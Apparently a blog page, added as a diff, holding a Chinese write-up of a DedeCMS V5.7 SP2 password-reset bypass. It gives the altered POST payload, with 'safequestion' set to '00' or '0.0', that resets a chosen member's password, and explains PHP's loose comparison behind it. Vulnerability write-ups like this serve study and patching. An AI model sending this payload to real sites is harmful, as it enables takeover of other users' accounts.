@@ -1,0 +1,515 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      DedeCMS 前台任意用户密码修改漏洞 
+      
+      
+      |
+    
+     N0puple
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/001.ico">
+    <link rel="icon" href="/images/001.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">N0puple</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">主页</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">归档</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">标签</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">朋友</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">DedeCMS 前台任意用户密码修改漏洞</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-06-28 21:09:46
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/php/" title="php">
+                    <b>#</b> php
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/dedecms/" title="dedecms">
+                    <b>#</b> dedecms
+                  </a>
+                </span>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/" title="密码修改">
+                    <b>#</b> 密码修改
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>织梦内容管理系统(Dedecms)是一款PHP开源网站管理系统。在用户密码重置功能处，php  存在弱类型比较，如果用户没有设置密保问题，那么可以绕过验证密保问题，直接修改密码(管理员账户默认不设置密保问题)。值得注意的是修改的密码是 member 表中的密码，即使修改了管理员密码也是 member 表中的管理员密码，仍是无法进入管理。</p>
+<h2 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h2><p>DedeCMS V5.7 SP2</p>
+<p>开启会员功能</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>需要管理员开启会员功能，开启流程为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">系统 -&gt; 系统基本参数 -&gt; 会员设置</span><br></pre></td></tr></table></figure>
+
+<p>然后进入找回密码，选择 “通过安全问题找回”，填写正确的用户名与邮箱</p>
+<p>没有密码问题的用户，会得到这样的提示</p>
+<p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210628212228.png"></p>
+<p>不要紧，重来并用burp 抓包，更改 post 数据</p>
+<p>原本的 post 数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dopost&#x3D;getpwd&amp;gourl&#x3D;&amp;userid&#x3D;ada&amp;mail&#x3D;123456%40admin.com&amp;vdcode&#x3D;vogr&amp;type&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p>更改后的 post 数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dopost&#x3D;safequestion&amp;id&#x3D;2&amp;safequestion&#x3D;00&amp;safeanswer&#x3D;0</span><br></pre></td></tr></table></figure>
+
+<p>id 为 想要更改的用户账号 id，发包即可</p>
+<p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210628212956.png"></p>
+<p>访问得到的链接，就可以修改密码</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>来到 member/resetpassword.php</p>
+<p>根据漏洞复现中更改的 post 的数据来看，实际上将 dopost 的值改了，这样就实现了直接从 getpwd 步骤跳到了 safequestion，我们直接来到 safequestion ，在 75 到 93 行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$mid</span> = preg_replace(<span class="string">&quot;#[^0-9]#&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = &#x27;<span class="subst">$mid</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$db</span>-&gt;GetOne(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$safequestion</span>)) <span class="variable">$safequestion</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$safeanswer</span>)) <span class="variable">$safeanswer</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;safequestion&#x27;</span>] == <span class="variable">$safequestion</span> &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;safeanswer&#x27;</span>] == <span class="variable">$safeanswer</span>)</span><br><span class="line">&#123;</span><br><span class="line">    sn(<span class="variable">$mid</span>, <span class="variable">$row</span>[<span class="string">&#x27;userid&#x27;</span>], <span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>], <span class="string">&#x27;N&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    ShowMsg(<span class="string">&quot;对不起，您的安全问题或答案回答错误&quot;</span>,<span class="string">&quot;-1&quot;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里逻辑比较简单，首先获取一个 id 赋值给 <code>$mid</code> ，这个 id 我们可以直接 POST，之后就是使用的 sql 语句，得到数据库中存储的内容，我们来看看 dede_member 内容</p>
+<p><img src="https://gitee.com/N0puple/nopic/raw/master/img/20210628214408.png"></p>
+<p>可能有师傅会奇怪这个表不是 <code>#@__member</code> 么，怎么变成 dede_member 了，这是因为这个 sql 语句执行前会进行一些操作，数据库中就是 dede_member ，当然也有可能是其他的前缀，位于 <code>include/dedesql.class.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetQuery</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$prefix</span>=<span class="string">&quot;#@__&quot;</span>;</span><br><span class="line">    <span class="variable">$sql</span> = str_replace(<span class="variable">$prefix</span>,<span class="variable">$GLOBALS</span>[<span class="string">&#x27;cfg_dbprefix&#x27;</span>],<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;queryString = <span class="variable">$sql</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据上图，我们可以知道，没有设置密保的用户，他们数据库中的值为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$row</span>[<span class="string">&#x27;safequestion&#x27;</span>] = <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="variable">$row</span>[<span class="string">&#x27;safeanswer&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们继续看之前的代码，我们传进来的代码会先判空，如果是空，那么就设置成空字符，我们需要传进来的值与上面数据库中取值相等就可以重置密码，如果我们这样传值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$safequestion</span>=<span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="variable">$safeanswer</span>=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们会发现不符合条件，因为 empty(0) 为真，空是空，0也是空，全部会置空，就没法匹配到 0，那我们要怎么做呢，这里可以</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$safequestion</span>=<span class="string">&#x27;00&#x27;</span></span><br><span class="line"><span class="variable">$safeanswer</span>=<span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>因为后面的比较是两个等号，也就是弱比较 ，’00’ 可以等于 ‘0’ ，’0.0’ 也可以等于 ‘0’</p>
+<p>最后传值</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dopost&#x3D;safequestion&amp;id&#x3D;2&amp;safequestion&#x3D;0.0&amp;safeanswer&#x3D;</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个漏洞只需要存在没有设置密保问题的用户就行，直接 post id就可以，用户名会直接在修改密码中取出来，还是比较好的，唯一的缺点就是只能更改 member 中的 admin 账户密码，没法利用这个登陆到后台</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/06/28/DedeCMS-%E5%90%8E%E5%8F%B0%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-06-28 21:09:46
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/php/" title="php">
+                        <b>#</b> php
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/dedecms/" title="dedecms">
+                        <b>#</b> dedecms
+                      </a>
+                    </span>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/" title="密码修改">
+                        <b>#</b> 密码修改
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/06/29/%E5%8F%8B%E7%82%B9CMS-%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87-GetShell/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-text">漏洞描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D"><span class="toc-text">漏洞影响</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/N0puple/">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="tudouqunaliwa@163.com">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/N0puple/">Copyright © N0puple 2020</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="back-to-top hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+      
+  <div class="search-icon" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+    </div>
+  </body>
+</html>
